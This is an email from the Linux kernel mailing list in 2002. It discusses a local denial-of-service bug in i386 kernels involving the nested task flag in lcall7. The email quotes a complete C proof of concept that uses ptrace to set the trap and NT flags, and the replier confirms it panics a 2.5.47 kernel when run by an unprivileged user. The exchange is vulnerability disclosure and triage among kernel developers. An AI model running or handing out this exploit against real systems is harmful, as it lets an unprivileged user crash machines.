Return-Path: <linux-kernel-owner+willy=40w.ods.org@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id <S263276AbSKMUaF>; Wed, 13 Nov 2002 15:30:05 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org
	id <S263310AbSKMUaF>; Wed, 13 Nov 2002 15:30:05 -0500
Received: from mailgw.cvut.cz ([147.32.3.235]:9119 "EHLO mailgw.cvut.cz")
	by vger.kernel.org with ESMTP id <S263276AbSKMUaE>;
	Wed, 13 Nov 2002 15:30:04 -0500
From: "Petr Vandrovec" <VANDROVE@vc.cvut.cz>
Organization: CC CTU Prague
To: Leif Sawyer <lsawyer@gci.com>
Date: Wed, 13 Nov 2002 21:36:47 +0100
MIME-Version: 1.0
Content-type: text/plain; charset=US-ASCII
Content-transfer-encoding: 7BIT
Subject: RE: FW: i386 Linux kernel DoS (clarification)
Cc: Linux Kernel Mailing List <linux-kernel@vger.kernel.org>
X-mailer: Pegasus Mail v3.50
Message-ID: <76C6E114FA8@vcnet.vc.cvut.cz>
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

On 13 Nov 02 at 11:23, Leif Sawyer wrote:
> #include <sys/ptrace.h>
> 
> struct user_regs_struct {
>         long ebx, ecx, edx, esi, edi, ebp, eax;
>         unsigned short ds, __ds, es, __es;
>         unsigned short fs, __fs, gs, __gs;
>         long orig_eax, eip;
>         unsigned short cs, __cs;
>         long eflags, esp;
>         unsigned short ss, __ss;
> };
> 
> int main( void )
> {
>     int pid;
>     char dos[] = "\x9A\x00\x00\x00\x00\x07\x00";
>     void (* lcall7)( void ) = (void *) dos;
>     struct user_regs_struct d;
> 
>     if( ! ( pid = fork() ) )
>     {
>         usleep( 1000 );
>         (* lcall7)();
>     }
>     else
>     {
>         ptrace( PTRACE_ATTACH, pid, 0, 0 );
>         while( 1 )
>         {
>             wait( 0 );
>             ptrace( PTRACE_GETREGS, pid, 0, &d );
>             d.eflags |= 0x4100; /* set TF and NT */
>             ptrace( PTRACE_SETREGS, pid, 0, &d );
>             ptrace( PTRACE_SYSCALL, pid, 0, 0 );
>         }
>     }
> 
>     return 1;
> }
> 
> At the beginning I thought only kernels <= 2.4.18 were affected; but it
> appeared that both kernels 2.4.19 and 2.4.20-rc1 are vulnerable as well.
> The flaw seems to be related to the kernel's handling of the nested task 
> (NT) flag inside a lcall7. 

2.5.47-current-bk, run as mere user: Kernel panic: Attempted to kill init!
Next time I'll trust you.
                                                Petr Vandrovec
                                                vandrove@vc.cvut.cz
                                                
